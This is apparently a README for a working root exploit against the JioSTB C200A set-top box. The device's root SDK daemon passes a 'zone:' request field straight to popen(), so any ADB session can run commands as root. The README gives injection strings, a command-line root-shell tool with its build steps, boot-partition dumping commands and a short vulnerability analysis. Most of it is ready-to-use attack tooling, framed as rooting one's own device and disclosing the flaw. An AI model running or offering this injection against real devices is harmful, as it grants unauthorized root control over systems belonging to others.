# JioSTB C200A (ohm) — sdknativeservice Root Shell

## What This Is

A root command execution exploit that abuses Jio's own SDK native daemon. No CVE
required — the daemon is designed this way. It runs as **uid 0 (root)**, accepts
binder calls from the ADB shell domain, and passes attacker-controlled strings
directly to `popen()` with zero sanitization.

This is used by `pull_boot.sh` to extract the boot partition for Magisk patching,
but it's a general-purpose root shell — any command you send runs as root.

## Device

- **Model:** JioSTB C200A, Amlogic S905X4, Android 11
- **Works with:** SELinux enforcing OR permissive (shell is allowed in sepolicy)
- **Requires:** ADB access (via `stage1.sh`), sdknativeservice running

## How It Works

### The Daemon

`/system/bin/sdknativeservice` is an init-started native daemon that provides
device management APIs to the Jio app suite. It runs as:

```
service sdknativeservice /system/bin/sdknativeservice
    class main
    user root
    group root shell bluetooth system
```

It registers itself as binder service `com.jio.sdk.sdknativeservice` and listens
for requests from any caller. The SELinux domain `sdknativeservice` has capabilities:
`dac_override`, `dac_read_search`, `net_admin`, `net_raw`, `setuid`, `sys_module`,
`sys_ptrace`, and `execute_no_trans` on `/system/bin/sh`.

### The Vulnerability

The daemon's request handler `SDKNativeServiceImpl::processRequest(int, vector<string>)`
dispatches to per-module handlers based on a `module` and `cmd` key in the request.
There is **no caller identity check** anywhere in this path — no `getCallingUid()`,
no `checkPermission()`, nothing. This was confirmed both by:
- Absence of these symbols in the dynamic import table (`nm -DC`)
- Ghidra decompilation of the dispatch function

The **OS module** (module id 4) has a `get-cpu-temperature` command. Internally,
it reads the `zone:` parameter from the request and passes it to a helper function
that calls `popen(zone_string, "r")`. The intended usage is:

```
zone:cat /sys/class/thermal/thermal_zone0/temp
```

But there is no validation. The zone string IS the shell command. So you can send:

```
zone:id
zone:dd if=/dev/block/by-name/boot_a of=/tmp/boot.img bs=4096
zone:cat /proc/kallsyms
```

And each runs as root.

### The Call Chain

```
ADB shell (uid 2000, SELinux domain "shell")
  │
  ├── SELinux check: allow shell sdknativeservice_service:service_manager find  ✓
  ├── SELinux check: allow shell sdknativeservice:binder call                   ✓
  │   (via: allow appdomain binderservicedomain:binder {call transfer})
  │
  ▼
ServiceManager.getService("com.jio.sdk.sdknativeservice")
  │
  ▼
Binder.transact(TRANSACTION_CODE=1, data=Parcel{
    interfaceToken: "com.jio.sdk.platform.nativeservice.aidl.IJioSDKNativeServiceInterface"
    int: 4                          // array size hint
    String[]: [
        "module:os",
        "cmd:get-cpu-temperature",
        "zone:<YOUR COMMAND HERE>"
    ]
})
  │
  ▼
sdknativeservice (uid 0, root)
  └── processRequest(moduleId=4, args)
      └── OSModule → CpuTempHelper::exec(zone_string)
          └── popen("<YOUR COMMAND>", "r")
              └── output read via fread() loop, returned in Parcel
```

### Who Can Reach the Daemon

From the compiled SELinux policy (`precompiled_sepolicy`), these domains can
`find` the service in ServiceManager AND `call` its binder:

| Domain | How | Notes |
|--------|-----|-------|
| `system_app` | Direct allow rule | TR069 client and 7 other Jio apps |
| `platform_app` | appdomain → binderservicedomain | Any platform-signed app |
| `priv_app` | appdomain → binderservicedomain | Privileged apps |
| `shell` | appdomain → binderservicedomain | **ADB shell** |
| `jiosdkservice_app` | Direct allow rule | JioSDKService app |

Notably **absent**: `untrusted_app` — cannot `find` the service. So a sideloaded
app can't reach it directly, but the ADB shell can.

### Why It Doesn't Need SELinux Permissive

The `shell` domain is explicitly granted access to `sdknativeservice` in the
stock sepolicy. This is not a bypass — Jio intentionally added these rules.
The daemon itself runs in the `sdknativeservice` domain with `dac_override` and
`execute_no_trans sh`, so it can read/write any file and execute shell commands
regardless of DAC permissions.

SELinux permissive is only needed if you want to do things the sdknativeservice
domain itself can't do (which is very little — it has near-root SELinux caps).

## The Tool: RootShell2

`rootshell2.jar` is a DEX-packaged Java tool that wraps the above into a
command-line interface. It uses `app_process` to run in the Android runtime
(needed for `ServiceManager` and `Parcel` access).

### Source: `src/RootShell2.java`

The tool:
1. Gets the `sdknativeservice` binder via `ServiceManager.getService()`
2. Constructs a Parcel with the AIDL interface token and the command array
3. Calls `binder.transact(1, data, reply, 0)`
4. Reads the string result from the reply Parcel

For captured output (`-c` flag), it redirects the command's stdout to a temp file
(`/mnt/vendor/param/.rs_out`), then reads it back via the service's
`read-content-from-file` API. This two-step is needed because `popen()` has a
small read buffer (128 bytes) — large output gets truncated without the redirect.

### Modes

```bash
# Interactive pseudo-shell (push jar first: adb push rootshell2.jar /data/local/tmp/)
adb shell "CLASSPATH=/data/local/tmp/rootshell2.jar /system/bin/app_process / RootShell2"
# root# id
# uid=0(root) gid=0(root)
# root# cat /proc/version
# root# exit

# Single command (captured output)
adb shell "CLASSPATH=/data/local/tmp/rootshell2.jar /system/bin/app_process / RootShell2 -c id"

# Single command (silent — for writes/redirects)
adb shell "CLASSPATH=/data/local/tmp/rootshell2.jar /system/bin/app_process / RootShell2 -x 'echo 1 > /sys/something'"

# Read a file via the service's read-content-from-file API
adb shell "CLASSPATH=/data/local/tmp/rootshell2.jar /system/bin/app_process / RootShell2 -r /proc/kallsyms"
```

### Building from Source

```bash
# Requires: JDK, Android SDK build-tools (d8)
javac src/RootShell2.java
d8 --output . RootShell2.class
zip rootshell2.jar classes.dex
rm -f RootShell2.class classes.dex
```

## Files

| File | Purpose |
|------|---------|
| `pull_boot.sh` | Extracts boot.img via sdknativeservice for Magisk patching |
| `rootshell2.jar` | Pre-built DEX tool for root command execution |
| `src/RootShell2.java` | Source for rootshell2.jar |

## Usage: Extracting boot.img

After unlocking the bootloader, factory resetting, re-running stage1, and setting
SELinux to permissive (see `Housekeeping-UBoot.md`):

```bash
./pull_boot.sh                        # auto-detects active slot, pulls boot.img
./pull_boot.sh --slot _b              # specific slot
./pull_boot.sh --out my_boot.img      # custom output filename
```

Then patch with Magisk and flash:
```bash
# Transfer boot.img to phone → Magisk app → Install → Select and Patch a File
# Transfer magisk_patched-*.img back to PC
adb reboot bootloader
fastboot flash boot_a magisk_patched-XXXXX.img   # use your active slot
fastboot reboot
```

### Running arbitrary root commands

```bash
./pull_boot.sh --cmd "id"
./pull_boot.sh --cmd "cat /proc/kallsyms | head -20"
./pull_boot.sh --cmd "ls -la /dev/block/by-name/"
./pull_boot.sh --cmd "getenforce"
./pull_boot.sh --cmd "getprop ro.boot.vbmeta.device_state"
```

## Troubleshooting

### "Service not found"
The `sdknativeservice` daemon isn't running. It starts at boot via init.rc, but
may have been killed if the Jio SDK app was disabled or uninstalled.

Fix: reboot the device. The daemon starts independently of the Jio apps — it's
an init service, not an app component. If it still doesn't start, check:
```bash
adb shell service check com.jio.sdk.sdknativeservice
adb shell getprop init.svc.sdknativeservice    # should be "running"
```

### Output truncated / empty
The `popen()` read buffer is 128 bytes. For commands with large output, RootShell2
redirects to a temp file and reads it back. If the temp path
(`/mnt/vendor/param/.rs_out`) isn't writable (e.g., after a factory reset changed
mount options), output may be lost.

Fix: use the `-r` flag to read files directly, or redirect output yourself:
```bash
./pull_boot.sh --cmd "your_command > /data/local/tmp/output.txt 2>&1"
adb pull /data/local/tmp/output.txt
```

### Permission denied (with SELinux enforcing)
The shell domain can reach sdknativeservice, but the daemon domain may not have
SELinux permission for the specific file/device you're targeting. For example,
reading `/dev/block/by-name/boot_*` requires the `sdknativeservice` domain to have
a `block_device` access rule.

Fix: set SELinux to permissive first (see `Housekeeping-UBoot.md`, step 5):
```bash
./unlock.sh selinux
adb reboot
```

## Security Analysis

### Weaknesses Exploited

1. **No caller authentication** (CWE-862 Missing Authorization)
   `sdknativeservice` accepts binder transactions from any SELinux-allowed domain.
   It never calls `getCallingUid()`, `getCallingPid()`, or `checkPermission()`.
   Any domain that can find+call the service gets root execution.

2. **Command injection via popen** (CWE-78 OS Command Injection)
   The `get-cpu-temperature` handler passes the `zone:` parameter directly to
   `popen()`. The intended usage is a thermal zone path, but any shell command
   works. No input validation, no escaping, no allowlist.

3. **Overly permissive SELinux policy**
   The stock sepolicy allows the `shell` domain (ADB) to reach the root daemon.
   This is a policy decision by Jio, not a bypass. Combined with #1 and #2, it
   means any ADB session has root.

### What This Means

On any JioSTB with `sdknativeservice` running and ADB enabled, you have root.
No exploit needed — just push a jar and talk to the binder. The "exploit" is
using the service exactly as designed, just not by the intended caller.
